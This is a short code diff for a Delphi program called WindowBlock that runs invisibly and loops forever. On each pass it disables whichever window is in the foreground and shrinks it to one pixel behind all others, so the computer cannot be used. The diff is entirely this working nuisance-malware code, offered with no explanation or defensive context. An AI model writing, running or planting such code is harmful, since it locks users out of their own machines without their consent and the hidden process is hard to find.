@@ -1,14 +1,24 @@
 program WindowBlock;
 
-uses
-  Vcl.Forms,
-  Unit2 in 'Unit2.pas' {Form2};
+{$APPTYPE GUI}
 
 {$R *.res}
 
+uses
+  Winapi.Windows,
+  Winapi.Messages,
+  System.SysUtils,
+  System.Variants,
+  System.Classes;
+
+var
+ H: Thandle;
 begin
-  Application.Initialize;
-  Application.CreateForm(TForm2, Form2);
-  Application.ShowMainForm:=false;
-  Application.Run;
+FreeConsole();
+while 1=1 do
+begin
+H := GetForeGroundWindow();
+EnableWindow(H,False);
+SetWindowPos(H,HWND_BOTTOM,0,0,1,1,SWP_nomove);
+end;
 end.
